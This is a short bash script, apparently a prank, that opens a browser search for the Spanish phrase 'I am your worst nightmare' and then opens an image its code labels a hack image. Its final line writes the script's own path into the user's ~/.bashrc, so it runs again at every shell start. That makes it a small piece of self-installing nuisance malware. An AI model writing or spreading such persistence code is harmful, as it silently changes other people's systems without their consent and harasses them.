#!/bin/bash
NOMBRE="SOY TU PEOR PESADILLA"
xdg-open "https://www.google.com/search?q=${NOMBRE}"
HACK_IMAGE="https://i.imgur.com/EsnPdi3.jpg"
sleep 2
xdg-open "${HACK_IMAGE}"
#chmod +x open_google.sh
echo "$(pwd)/open_google.sh" >> ~/.bashrc